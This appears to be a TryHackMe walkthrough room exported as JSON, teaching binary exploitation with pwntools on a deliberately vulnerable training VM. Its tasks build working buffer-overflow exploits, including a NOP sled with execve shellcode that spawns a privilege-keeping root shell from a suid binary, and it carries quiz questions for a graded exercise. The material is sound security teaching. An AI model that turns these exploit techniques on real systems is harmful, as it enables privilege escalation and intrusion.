{'image': 'https://tryhackme-images.s3.amazonaws.com/room-icons/2eb62778d0ace3b308a4f635c198aff7.png', 'title': 'Intro To Pwntools', 'description': 'An introductory room for the binary exploit toolkit Pwntools.', 'code': 'introtopwntools', 'users': 5542, 'tags': ['binary exploit', 'pwntools', 'buffer overflow', 'exploit development'], 'type': 'walkthrough', 'difficulty': 'easy', 'userCompleted': False, 'upVotes': 386, 'created': '2021-06-10T14:08:46.222Z', 'published': '2021-08-24T19:00:00.415Z', 'freeToUse': True, 'businessOnly': False, 'headerImage': 'https://raw.githubusercontent.com/Gallopsled/pwntools/stable/docs/source/logo.png', 'creator': 'DiZma', 'tasks': [{'taskTitle': 'Introduction', 'taskDesc': '<p>Hello there, and welcome to Intro to Pwntools!</p><p>My name is DiZma$ and I will be your guide through this journey of software exploitation.\xa0<span style="font-size:1rem">When I started learning binary exploitation and CTFs, I learned that many CTF players use Pwntools, but when I searched for a basic guide on how to get started, I found little on the topic. Because of this, I set out to create my own tutorial.\xa0</span><span style="font-size:1rem">Accord<span style="font-family:Ubuntu;font-size:16px">ing to the Pwntools github, "</span></span><span style="font-size:16px;color:rgb(36, 41, 46);font-family:Ubuntu">Pwntools is a CTF framework and exploit development library. Written in Python, it is designed for rapid prototyping and development, and intended to make exploit writing as simple as possible</span><span style="font-size:16px;font-family:Ubuntu">" (</span><a href="https://github.com/Gallopsled/pwntools" target="_blank"><span style="font-family:Ubuntu;font-size:16px">Pwntools Github page</span></a><span style="font-size:16px;font-family:Ubuntu">).</span></p><p><span style="font-size:16px;font-family:Ubuntu">Prior experience in binary exploitation is not required for this room, although it may help. I will provide brief explanations, although if you would like more in-depth material, I will try to direct you to some helpful sources.</span></p><p><br /></p><p><span style="font-size:18px"><u><b>Tools and Installation:</b></u></span></p><p><span style="font-size:16px">The tools and challenges for today are on the provided VM, although if you would like, you can set them up on your own machine:</span></p><p><span style="font-size:16px">Pwntools can be installed through pip. You can follow the installation guide here:\xa0</span><a href="https://docs.pwntools.com/en/stable/install.html" target="_blank">https://docs.pwntools.com/en/stable/install.html</a>. Please note, I have set up Pwntools with python2 on the VM for today, because I prefer exploit development in python2.</p><p>The other tool we will be using is pwndbg, whic<span style="font-family:Ubuntu;font-size:16px">h is "</span><span style="color:rgb(36, 41, 46);font-family:Ubuntu;font-size:16px">a GDB plug-in that makes debugging with GDB suck less, with a focus on features needed by low-level software developers, hardware hackers, reverse-engineers and exploit developers</span><span style="font-size:16px;font-family:Ubuntu">" (</span><a href="https://github.com/pwndbg/pwndbg" target="_blank"><span style="font-family:Ubuntu;font-size:16px">pwndbg Github page</span></a><span style="font-size:1rem"><span style="font-family:Ubuntu;font-size:16px">). If you have ever used gdb for binary exploitation, you know it can be cumbersome. Pwndbg prints out useful information, such as registers and assembly code, with each breakpoint or error, making deb</span>ugging and dynamic analysis easier. To install it, you can refer to the Github page. All you need to do is download it from Github and run the setup script, and it will automatically attach to gdb.</span></p><p>Lastly, if you would like to download the challenges from this room to use on your own machine, you can find them (and my solutions) on my Github:\xa0<a href="https://github.com/dizmascyberlabs/IntroToPwntools" target="_blank">https://github.com/dizmascyberlabs/IntroToPwntools</a>.</p><p><br /></p><p><b><u><span style="font-size:18px">Starting up the machine and Logging in:</span></u></b></p><p>Please start up the attached VM. Once it is started, you can ssh into it with the following credentials:</p><p style="line-height:1">user: buzz</p><p style="line-height:1">pass: buzz</p><p><code>ssh buzz@MACHINE_IP</code></p><p><code>buzz@MACHINE_IP\'s password: buzz</code></p><p><span style="font-family:Ubuntu">\ufeff</span></p><p><span style="font-family:Ubuntu">Please note that after typing in the password, you may have to wait a few seconds before you are logged in.</span></p><p><span style="font-family:Ubuntu">Let\'s get pwning!<br /></span><br /></p>', 'taskType': 'vm', 'taskNo': 1, 'taskCreated': '2021-06-10T14:12:32.035Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '60cb9a1809ba9e0041c130c0', 'questions': [{'questionNo': 1, 'question': 'I understand how to set up Pwntools and pwndbg on my own machine.', 'hint': ''}, {'questionNo': 2, 'question': '<p>I have started the machine, and logged in through ssh.</p>', 'hint': ''}]}, {'taskTitle': 'Checksec', 'taskDesc': '<p>In your home directory, you should see two directories, IntroToPwntools and pwndbg.\xa0 Our challenges are in IntroToPwntools. If you enter that directory, you will see a note, and another directory of the same name.\xa0 When you are ready, enter the second IntroToPwntools directory to begin your adventure!</p><p><br /></p><p><b><u><span style="font-size:18px">Checksec tool</span></u></b></p><p>You will find the four directories enclosed: checksec, cyclic, networking, and shellcraft. We will start with checksec.</p><p>Inside the checksec directory, we will find some c code and executables, both compiled from the c code. If you run either one, they seem to be the same program: it prompts for the user\'s name, and replies "Hello name!" These binaries may appear to be the same program, but one was compiled with protections to mitigate binary exploitation, while the other was compiled without these protections.</p><p>Run the following command and observe the result (as a warning, this command can be a little slow):</p><p><code>checksec intro2pwn1</code></p><p><span style="font-family:Ubuntu;font-size:16px">Now run the same command with intro2pwn2.</span></p><p><span style="font-family:Ubuntu;font-size:16px">As you can s</span><span style="font-family:Ubuntu;font-size:16px">ee, these binaries both have the same architecture (i386-32-little), but differ in qualities such as RELRO, Stack\xa0</span><span style="color:rgba(0, 0, 0, 0.82);font-family:Ubuntu;font-size:16px">canaries</span><span style="color:rgba(0, 0, 0, 0.82);font-family:Ubuntu;font-size:16px">\xa0</span><span style="font-family:Ubuntu;font-size:16px">, NX, PIE, and RWX. Now, what are these qualities? Allow me to explain. Please note, this room does not require a deep knowledge of these beyond the basics.</span></p><p><span style="font-family:Ubuntu;font-size:16px"><b>RELRO</b> stands for\xa0</span><span style="color:rgb(21, 21, 21);font-family:Ubuntu;font-size:16px">Relocation Read-Only, which makes the global offset table (GOT) read-only after the linker resolves functions to it. The GOT is important for techniques such as the ret-to-libc attack, although this is outside the scope of this room. If you are interested, you can refer to this blog post:\xa0</span><a href="https://www.redhat.com/en/blog/hardening-elf-binaries-using-relocation-read-only-relro" target="_blank"><span style="font-size:16px">https://www.redhat.com/en/blog/hardening-elf-binaries-using-relocation-read-only-relro</span></a><span style="font-family:Ubuntu;font-size:16px">.</span></p><p><b><span style="font-family:Ubuntu;font-size:16px">Stack\xa0</span><span style="color:rgba(0, 0, 0, 0.82);font-family:Ubuntu;font-size:16px">canaries</span></b>\xa0are tokens placed after a stack to detect a stack overflow. These were\xa0supposedly named after birds that\xa0coal miners brought down to mines to detect noxious fumes. Canaries were sensitive to the fumes, and so if they died, then the miners knew they needed to evacuate. On a less morbid note, stack canaries sit beside the stack in memory (where the program variables are stored), and if there is a stack overflow, then the canary will be corrupted. This allows the program to detect a buffer overflow and shut down. You can read more about stack canaries here:\xa0<a href="https://www.sans.org/blog/stack-canaries-gingerly-sidestepping-the-cage/" target="_blank">https://www.sans.org/blog/stack-canaries-gingerly-sidestepping-the-cage/</a><span style="font-size:1rem">.</span></p><p><b>NX</b> is short for non-executable. If this is enabled, then memory segments can be either writable or executable, but not both. This stops potential attackers from injecting their own malicious code (called shellcode) into the program, because something in a writable segment cannot be executed.\xa0 On the vulnerable binary, you may have noticed the extra line <b>RWX </b>that indicates that there are segments which can be read, written, and executed. See this Wikipedia article for more details:\xa0<a href="https://en.wikipedia.org/wiki/Executable_space_protection" target="_blank">https://en.wikipedia.org/wiki/Executable_space_protection</a></p><p><b>PIE</b> stands for Position Independent Executable. This loads the program dependencies into random locations, so attacks that rely on memory layout are more difficult to conduct. Here is a good blog about this:\xa0<a href="https://access.redhat.com/blogs/766093/posts/1975793" target="_blank">https://access.redhat.com/blogs/766093/posts/1975793</a><a href="https://access.redhat.com/blogs/766093/posts/1975793" target="_blank"></a></p><p>If you want a good overview of each of the checksec tested qualities, I have found this guide to be useful:\xa0<a href="https://blog.siphos.be/2011/07/high-level-explanation-on-some-binary-executable-security/" target="_blank">https://blog.siphos.be/2011/07/high-level-explanation-on-some-binary-executable-security/</a></p>', 'taskType': 'none', 'taskNo': 2, 'taskCreated': '2021-06-10T21:20:26.267Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'Does Intro2pwn1 have FULL RELRO (Y or N)?', 'hint': ''}, {'questionNo': 2, 'question': '<p>Does Intro2pwn1 have RWX segments (Y or N)?</p>', 'hint': ''}, {'questionNo': 3, 'question': '<p>Does Intro2pwn2 have a stack canary (Y or N)?</p>', 'hint': ''}, {'questionNo': 4, 'question': '<p>Does Intro2pwn2\xa0<u>not</u> have PIE (Y or N)?</p>', 'hint': ''}, {'questionNo': 5, 'question': '<p>Cause a buffer overflow on intro2pwn1 by inputting a long string such as AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA. What was detected?\xa0</p>', 'hint': 'Buzz smash!'}, {'questionNo': 6, 'question': '<p>Now cause a buffer overflow on intro2pwn2. What error do you get?</p>', 'hint': 'This is often shortened to seg-fault. These are good news for the hacker. It means that you have directed the instruction pointer to an invalid place in memory. More on that later...'}]}, {'taskTitle': 'Cyclic', 'taskDesc': '<p>Good work! Now cd out of the checksec directory. Next on our\xa0itinerary is the cyclic directory. You should find 4 files there: a text of alphabet characters, a flag file, an executable, and the code for the executable. If we try to read the flag file, we are denied permission. If only we could get somebody else to open it...</p><p><b><u><span style="font-size:18px">Setting the stage:</span></u></b></p><p>if you run the command:</p><p><code>ls -l\xa0</code></p><p><span style="font-family:Ubuntu">\ufeffYou will see that the flag file and intro2pwn3 are owned by the same user, and that the suid bit is set for intro2pwn3. This means that the program will keep its permissions when it executes. Please answer question 1. </span></p><p><span style="font-family:Ubuntu">If you view the c code, you may notice the print_flag() function, which will open the flag with the permissions we need. The issue is that the function does not run in the program, the program simply calls start() then ends. What if we could redirect the execution somehow? In fact, we can!</span></p><p><span style="font-family:Ubuntu">This program is vulnerable to a buffer overflow, because it uses the gets() function, which does not check to see if the user input is actually in bounds (you can read about this\xa0</span><a href="https://faq.cprogramming.com/cgi-bin/smartfaq.cgi?answer=1049157810&amp;id=1043284351" target="_blank">here</a>). In our case, the name variable has 24 bytes allocated, so if we input more than 24 bytes, we can write to other parts of memory. Please answer question 2.</p><p>An important part of the memory we can overwrite is the instruction pointer (IP), which is called the eip on 32-bit machines, and rip on 64-bit machines. The IP points to the next instruction to be executed, so if we redirect the eip in our binary to the print_flag() function, we can print the flag.</p><p><b><u><span style="font-size:18px">Cyclic tool:</span></u></b></p><p> </p><p>To control the IP, the first thing we need do is to is overflow the stack with a pattern, so we can see where the IP is. I have provided the alphabet file as a pattern. Let\'s fire up gdb!</p><p><code>gdb intro2pwn3</code></p><p>To run a program in gdb, type <code>r</code>. You will see the program function normally. If you want to add an input from a text file, you use the "&lt;" key, as such:</p><p><code>r &lt; alphabet</code></p><p>We\'ve caused a segmentation fault, and you may observe that there is an invalid address at 0x4a4a4a4a. If you scroll up, you can see the values at each register. For eip, it has been overwritten with 0x4a4a4a4a. Please answer question 3.</p><p>Great, now we see that we can control the eip! Before we move on, I would like to talk about patterns. The alphabet file was useful here, but it can be time consuming to type all of that into a file (or write a script for it) every time you want to test a buffer overflow, and if the buffer is large, the alphabet file might not be big enough. This is where the cyclic tool comes in. The cyclic tool can be used both from the command line and in python scripts. The command line format is "cyclic number", like:</p><p><code>cyclic 100</code></p><p>This will print out a pattern of 100 characters Please q<span style="font-size:1rem">uit gdb by typing "quit" and\xa0</span><span style="font-size:1rem">answer question 4. </span></p><p><span style="font-size:1rem">If you have used pattern_create from the Metasploit Framework, this is works in a similar way. We can create a pattern file like this:</span></p><p><code>cyclic 100 &gt; pattern</code></p><p>and then run the pattern file as input in gdb like we did with the alphabet file. Once again, we have a seg-fault and the eip is filled with \'jaaa\' (p<span style="font-size:1rem">lease answer question 5).</span></p><p><b><u><span style="font-size:18px">Pwning to the flag:</span></u></b></p><p><span style="font-size:16px">\ufeffWe can now begin to develop our exploit. To use pwntools in a python file, create a python file (mine is pwn_cyclic.py) and import the pwntools module at the top of the file:</span></p><p><code>from pwn import *</code></p><p>We can then use the cyclic function within the python code:</p><p><code>padding = cyclic(100)</code></p><p>Our padding is the space we need to get to the eip, so 100 is not the number we need. We need our padding to stop right before \'jaaa\' so that we can fill in the eip with our own input. Luckily, there is a function in pwntools called cyclic_find(), which will find this automatically. Please replace the 100 with cyclic_find(\'jaaa\'):</p><p><code>padding = cyclic(cyclic_find(\'jaaa\'))</code></p><p>What do we fill the eip with? For now, to make sure we have the padding correct, we should fill it with a dummy value, like 0xdeadbeef. We cannot, of course, simply write "0xdeadbeef" as a string, because the computer would interpret it as ascii, and we need it as raw hex. Pwntools offers an easy way to do this, with the p32() function (and p64 for 64-bit programs). This is similar to the struct.pack() function, if you have ever used it. We can add this to our code:</p><p><code>eip = p32(0xdeadbeef)</code></p><p>Now our entire code should look like this:</p><p><code>from pwn import *</code></p><p><code>padding = cyclic(cyclic_find(\'jaaa\'))</code></p><p><code>eip = p32(0xdeadbeef)</code></p><p><code>payload = padding + eip</code></p><p><code>print(payload)</code></p><p>Please run the file with python (not python3!) and output to a text file (my python file is called pwn_cyclic.py and my text file is called attack).</p><p><code>python pwn_cyclic.py &gt; attack</code></p><p> Run this new text file as input to intro2pwn3 in gdb, and make sure that you get an invalid address at 0xdeadbeef. Please answer question 6.</p><p>The last thing we need to do is find the location of the print_flag() function. To find the print_flag() funtion, type this command into gdb:</p><p><code>print&amp; print_flag</code></p><p>For me, the print_<span style="font-family:Ubuntu;font-size:16px">flag() function is at\xa0</span>0x8048536, please check to see if it is the same for you.</p><p>Replace the 0xdeadbeef in your code with the location of the print_flag function. Once, again, we can run:</p><p><code>python pwn_cyclic.py &gt; attack</code><span style="color:rgb(196, 20, 20);font-family:SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;background-color:rgb(234, 234, 237)"></span><br /></p><p> Input the attack file into the intro2pwn3 binary in the command line (because gdb will not use the suid permissions), like this:</p><p><code>./intro2pwn3 &lt; attack</code></p><p>Yay, a flag! Please answer question 7.</p>', 'taskType': 'none', 'taskNo': 3, 'taskCreated': '2021-06-11T16:54:04.900Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'Which user owns both the flag.txt and intro2pwn3 file?', 'hint': ''}, {'questionNo': 2, 'question': '<p>Use checksec on intro2pwn3. What bird-themed protection is missing?</p>', 'hint': 'What is the name of the token that detects an overflow?'}, {'questionNo': 3, 'question': '<p>What ascii letter sequence is 0x4a4a4a4a (pwndbg should tell you).</p>', 'hint': 'You can also use a hex to ascii converter.'}, {'questionNo': 4, 'question': '<p>What is the output of "cyclic 12"?</p>', 'hint': ''}, {'questionNo': 5, 'question': '<p>What pattern, in hex, was the eip overflowed with?</p>', 'hint': "Format: 0x******** ; What is 'jaaa' in hex (little endian)?"}, {'questionNo': 6, 'question': '<p>I have overflowed the eip with 0xdeadbeef</p>', 'hint': ''}, {'questionNo': 7, 'question': '<p>What is the flag?</p>', 'hint': ''}]}, {'taskTitle': 'Networking', 'taskDesc': '<p><span style="font-size:18px"><u>\ufeff</u></span>When you are ready to move on, please enter the networking directory. Inside, you will find a note, an executable, and more c code. In the last challenge, we manually inputted our exploit, although pwntools give us the ability send and receive data automatically. This can work both locally and over a networking port. For this challenge, we will use the networking tools, and in the next challenge, we will use the local tools.</p><p><b><u><span style="font-size:18px">Unpacking the code</span></u></b></p><p>The note tells us what port is serving our flag. Please answer question 1. </p><p>If you netcat that port, it was say "Give me deadbeef: " and prompt until the connection is closed (please note, each time the connection is closed, the service will close until the cron restarts it each minute). To test out exploit, we can run our own version on port 1336. We can use tmux or use a second ssh session to have two interfaces, one to run the service, and one to develop out exploit.</p><p>The code for this challenge is more involved that the previous challenges. I have used the following code, and edited it for my own purpose:\xa0<a href="https://www.geeksforgeeks.org/tcp-server-client-implementation-in-c/" target="_blank">https://www.geeksforgeeks.org/tcp-server-client-implementation-in-c/</a>. For this challenge, we do not need to concern ourselves with main(), but only the target_function(). The struct at the beginning of the function, called targets, has two variables: buff and printflag. The buff is a char array of size MAX (MAX was defined to 32), and the printflag is a volatile int. These variables will be right next to each other in the stack, so if we manage to overflow the buff variable, then we can edit the printflag. If you see further down in the code, if the printflag variable is equal to 0xdeadbeef (in hex) then it will send the flag. Please answer question 2.</p><p><b><u><span style="font-size:18px">Networking to the flag</span></u></b></p><p>We will need to write a script to connect to the port, receive the data, and send our payload. To connect to a port in Pwntools, use the remote() function in the format of: remote(IP, port).\xa0</p><p><code>from pwn import *</code></p><p><code>connect = remote(\'127.0.0.1\', 1336)</code></p><p>We can receive data with either the recvn(bytes) or recvline() functions. The recvn() receives as many bytes as specified, while the recvline() will receive data until there is a newline. Our code does not send a newline, so we will have to use recvn(). In our test_networking.c code, the "Give me deadbeef: " is 18 bytes, so we will receive 18 bytes.</p><p><code>print(connect.recvn(18))</code></p><p>We have to send enough data to overflow the buff variable, and write to the printflag. the buff is a 32 byte array, so we can write some character 32 times to overflow buff, and then write our 0xdeadbeef to printflag.</p><p><code>payload = "A"*32</code></p><p><code>payload += p32(0xdeadbeef)</code></p><p>We can send the payload with the send() function.</p><p><code>connect.send(payload)</code></p><p>To receive our flag, We can just use connect.recvn() again. According to the c code, the flag will be 34 bytes long.</p><p><code>print(connect.recvn(34))</code></p><p>Run this against your server at 1336 and make sure it works. Once you have, change the port to the answer to question 1 to receive the flag!</p>', 'taskType': 'none', 'taskNo': 4, 'taskCreated': '2021-06-14T17:12:51.845Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'What port is serving our challenge?', 'hint': ''}, {'questionNo': 2, 'question': '<p>Please use checksec on serve_test. Is there a stack canary? (Y or N)</p>', 'hint': 'Even if there is a canary on the binary, both variables are within the stack, so the overflow will still work.'}, {'questionNo': 3, 'question': '<p>I have run my exploit against my own server on port 1336</p>', 'hint': ''}, {'questionNo': 4, 'question': '<p>What is the flag?</p>', 'hint': ''}]}, {'taskTitle': 'Shellcraft', 'taskDesc': '<p>It is time for our final challenge! Please navigate to the shellcraft directory. Inside, you will find four files: a note, a bash script, the executable, and the c code. If you read the note, you will see that you need to disable ASLR, which stands for address space layout randomization. This randomizes where in memory the executable is loaded each time it is run. Like PIE, it makes attacks that rely on memory layout more difficult. Please answer question 1. </p><p>Please read the note and disable ASLR.</p><p><b><u><span style="font-size:18px">Root of the Issue:</span></u></b></p><p>Have you ever run an exploit on a machine to escalate\xa0privileges, and wondered how it works? Today, we are going to develop our own exploit to root this box! Some programs and services, such as sudo, need to run as root for the system to work properly, and when a vulnerability is discovered in one of these programs, an easy path to a root shell is opened. Please answer question 2. </p><p>You may have heard of the\xa0<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3156" target="_blank">heap buffer overflow vulnerability in sudo</a>\xa0which allowed for quick privilege escalation. The exploit, discovered in 2021, has its own\xa0<a href="https://tryhackme.com/room/sudovulnssamedit" target="_blank">room on TryHackMe</a>\xa0if you are interested in learning more about it.</p><p><b><u><span style="font-size:18px">Shell in the Haystack:</span></u></b></p><p>If we view the code for our executable, we see there is not much, just a call of gets(). If we remember from our cyclic task, gets() is vulnerable to buffer overflow, but this time, there is no print_flag() to jump to. When we control the eip, where should we jump to? Although there does not seem to be any useful instructions inside our code, what if we wrote our own instructions? Our variables are stored in memory, just like the program itself, so if we write instructions in our variable, and direct the eip to it, we can make the program follow our own instructions! This injected code is called shellcode, because it is traditionally (but not always) used to spawn a shell. If you recall, our variables are stored in the stack, so if we direct the eip to the stack, we will direct it to our shellcode. Please answer question 3.</p><p>Let\'s get control of that eip! Please find the location of the eip, like we did in the cyclic task. Please answer question 4. </p><p>I would recommend filling the eip with 0xdeadbeef like we did before.</p><p>Once we control the eip, we need to direct it to the stack where we can place our own code. The top of the stack is pointed to by the SP (or stack pointer) which is called esp in 32-bit machines. For me, the esp is located at 0xffffd510, and you can check the location of yours in gdb. If we want to jump to our shellcode, we want to jump to the middle of the stack (rather than the top where the SP points), so we usually add an offset to the esp location in your exploit. I use an offset of 200, because that\'s what ended up working for me. In other challenges, you may only need an offset of 8 or 16. I have found that choosing the right offset is a matter of trial and error.</p><p><code>from pwn import *</code></p><p><code>padding = cyclic(cyclic_find(\'answer_to_question_4\'))</code></p><p><code>eip = p32(0xffffd510+200)</code><span class="pl-s1" style="color:rgb(36, 41, 46);font-family:ui-monospace, SFMono-Regular, &quot;SF Mono&quot;, Consolas, &quot;Liberation Mono&quot;, Menlo, monospace;font-size:12px;white-space:pre"></span><br /></p><p>You may be wondering how we are going to point the eip to our shellcode (rather than other data in the stack), and the answer is to make our variable into a big landing spot. There is an instruction in assembly called no-operation (or NOP), which is 0x90 in hex, and the NOP is a space holder that passes the eip to the next space in memory. If we make a giant "landing pad" of NOPs, and direct the eip towards the middle of the stack, odds are that the eip will land on our NOP pad, and the NOPs will pass the eip down to eventually hit our shellcode. This is often called a NOP slide (or sled), because the eip will land in the NOPs and slide down to the shellcode. In my case, a NOP sled of 1000 worked, but other challenges may require different sizes. When writing a raw hex byte in python, we use the format "\\x00", so we can write "\\x90" for a NOP.</p><p><code>nop_slide = "\\x90"*1000</code></p><p>Before we write our shellcode, we can inject a breakpoint at the end of our NOP slide to make sure the slide works. The breakpoint instruction in hex is "0xcc", and so we can add the following to our code:</p><p><code>shellcode = "\\xcc"</code></p><p>Our payload should be as follows:</p><p><code>payload = padding + eip + nop_slide + shellcode</code></p><p>Please direct the output of this file to a text file.</p><p>if we input the text file to intro2pwnFinal, we should hit a breakpoint. Please answer question 5. </p><p>Great, we can inject our own code into the program! Of course, we want to do more than hit a breakpoint, we want to spawn a root shell. That means we need to write some shellcode. While some crazy people like to write shellcode from scratch, pwntools gives us a great utility to cook up shellcode: shellcraft. If you have ever used msfvenom, shellcraft is a similar tool. Like cyclic, shellcraft can be used in the command line and inside python code. I like to use the command line, and copy and paste the shellcode over to my exploit script. The command line command for shellcraft is: shellcraft arch.OS.command, such as:</p><p><code>shellcraft i386.linux.sh</code></p><p>This is for a basic bash shell for Linux executables with i386 architecture. A neat feature of shellcraft is that we can print out the shellcode in different formats with the -f flag. The possible formats are listed if you enter the shellcraft -h command. Please answer question 6.\xa0</p><p>There is a bit of a snag in the above shellcode. In order to get a root shell, we need to keep the privileges of intro2pwnFinal, although bash will drop the privileges unless we add the -p flag. If we observe the assembly code for this shell, we see that it uses execve and passes /bin///sh as the first parameter and [\'sh\'] as the second. The first parameter is the path to what we want to execute, and the second parameter is the argv array, which contains the command line arguments (If you are confused about execve, you can refer to this man page\xa0<a href="https://man7.org/linux/man-pages/man2/execve.2.html" target="_blank">here</a>).\xa0 In this case, we want to execute /bin///sh, but we want to pass \'sh\' and \'-p\' into the argv array. We can use shellcraft to create execve shellcode with"/bin///sh" and "[\'sh\', \'-p\']" as parameters. We can do this with the following command:</p><p><code>shellcraft i386.linux.execve "/bin///sh" "[\'sh\', \'-p\']" -f a</code></p><p>When we run this command, we see it is the same as the linux.sh shellcode, except the added \'-p\' to the argv array. To write shellcode that is easier to use in our python exploit script, we can replace the "-f a" with "-f s", which will print our shellcode in string format. We can copy that and paste it into our exploit code (replacing the breakpoint instruction):</p><p><code>shellcode = "jhh\\x2f\\x2f\\x2fsh\\x2fbin\\x89\\xe3jph\\x01\\x01\\x01\\x01\\x814\\x24ri\\x01,1\\xc9Qj\\x07Y\\x01\\xe1Qj\\x08Y\\x01\\xe1Q\\x89\\xe11\\xd2j\\x0bX\\xcd\\x80"</code><span style="color:rgb(3, 47, 98);font-family:ui-monospace, SFMono-Regular, &quot;SF Mono&quot;, Consolas, &quot;Liberation Mono&quot;, Menlo, monospace;font-size:12px;white-space:pre"></span><br /></p><p>Our code is almost done! Until this point, we have been printing our payload and manually inputting it into the executable. Like in the networking task, Pwntools allows us to interact with the program automatically. For a local process, we use the process() function.</p><p><code>proc = process(\'./intro2pwnFinal\')</code></p><p>We can receive data from the process, and since the process sends data with a new line, we can use recvline(), rather than recvn().</p><p><code>proc.recvline()</code></p><p>After we have crafted our payload, we can send it with:</p><p><code>proc.send(payload)</code></p><p>Finally, after we have sent the payload, we need a way to communicate with the shell we have just spawned. We can do with with\xa0</p><p><code>proc.interactive()</code></p><p>So, to recap, our whole python script is:</p><p><code style="font-size:14px">from pwn import *</code></p><p><code style="font-size:14px">proc = process(\'./intro2pwnFinal\')</code></p><p><code style="font-size:14px">proc.recvline()<br /></code></p><p><code style="font-size:14px">padding = cyclic(cyclic_find(\'taaa\'))</code></p><p><code style="font-size:14px">eip = p32(0xffffd510+200)</code></p><p><code style="font-size:14px">nop_slide = "\\x90"*1000<br /></code></p><p><code style="font-size:14px">shellcode = "jhh\\x2f\\x2f\\x2fsh\\x2fbin\\x89\\xe3jph\\x01\\x01\\x01\\x01\\x814\\x24ri\\x01,1\\xc9Qj\\x07Y\\x01\\xe1Qj\\x08Y\\x01\\xe1Q\\x89\\xe11\\xd2j\\x0bX\\xcd\\x80"</code></p><p><code style="font-size:14px">payload = padding + eip + nop_slide + shellcode</code></p><p><code style="font-size:14px">proc.send(payload)</code></p><p><code style="font-size:14px">proc.interactive()</code></p><p>Alright, that was a lot! Take a deep breath and run our python code. If we did this right, we should get an interactive shell. The first command may not register, but the second one should work. If you received an "Got EOF while reading in interactive", then you have an error, and will need to troubleshoot. The people at the THM discord are\xa0<a href="https://discord.com/channels/521382216299839518/522158539129618453" target="_blank">helpful</a>, and I hang out there frequently myself. Please answer question 7.</p><p>Congratulations, you have a root shell! You will find the flag in the /root directory.<br /></p>', 'taskType': 'none', 'taskNo': 5, 'taskCreated': '2021-06-14T21:48:33.511Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'What does ASLR stand for?', 'hint': ''}, {'questionNo': 2, 'question': '<p>Who owns intro2pwnFinal?</p>', 'hint': ''}, {'questionNo': 3, 'question': '<p>Use checksec on intro2pwn final. Is NX enabled? (Y or N)</p>', 'hint': 'If NX in enabled, then writable areas of memory (like the stack) are not executable. This means our shellcode would not execute. '}, {'questionNo': 4, 'question': '<p>Please use the cyclic tool and gdb to find the eip. What letter sequence fills the eip?</p>', 'hint': 'What is 0x61616174 is ascii?'}, {'questionNo': 5, 'question': '<p>Run your exploit with the breakpoint outside of gdb (./intro2pwnFinal &lt; output_file). What does it say when you hit the breakpoint?</p>', 'hint': 'In gdb, it will say "Program received signal SIGTRAP, Trace/breakpoint trap."'}, {'questionNo': 6, 'question': '<p>Run the command "shellcraft i386.linux.sh -f a", which will print our shellcode in assembly format. The first line will tell you that it is running a function from the Unix standard library, with the parameters of "(path=\'/bin///sh\', argv=[\'sh\'], envp=0)." What function is it using?</p>', 'hint': 'It is in the exec() family of functions.'}, {'questionNo': 7, 'question': '<p>Run whoami once you have the shell. Who are you?</p>', 'hint': ''}, {'questionNo': 8, 'question': '<p>What is the flag?</p>', 'hint': ''}]}, {'taskTitle': 'Conclusion', 'taskDesc': '<p>I hope you have enjoyed our adventure through binary exploitation and pwntools! There\'s not much else to do on our box, unless you\'re a strange person who likes to snoop in other people\'s home directories.</p><p><b><u><span style="font-size:18px">Final Words:</span></u></b></p><p>I want to emphasize that I am not an expert in software exploitation (or any other type of hacking). I\'m just a student and enthusiast, and I wanted to share something that I enjoyed with the rest of y\'all. This room scratched the surface of both binary exploitation in general and pwntools in particular, and there is a lot more out there to explore. Some resources that I have found helpful would be:</p><p><a href="https://www.youtube.com/playlist?list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN" target="_blank">Live Overflow\'s Binary Exploit Playlist on YouTube</a>\xa0(this is where I first learned this stuff!)</p><p><a href="https://exploit.education/" target="_blank">Exploit Education website</a>\xa0(Credit goes here, because the challenges for today were partially inspired by these exercises)</p><p><a href="https://github.com/guyinatuxedo/nightmare/tree/master/modules" target="_blank">Nightmare course on GitHub</a>\xa0(a huge collection of challenges from old CTFs)</p><p>Also, I have learned a lot from the talented CTF players that I have met in my short time with the community.\xa0 I had a great time developing this room, and I hope you had a great time solving it. I may have more content to develop in the future. For now, it\'s been a pleasure, goodbye!</p><p>Sincerely,</p><p>DiZma$</p>', 'taskType': 'none', 'taskNo': 6, 'taskCreated': '2021-06-15T23:58:38.450Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'I have learned the basics of pwntools, and I am now a 1337 h4x0r!', 'hint': ''}]}]}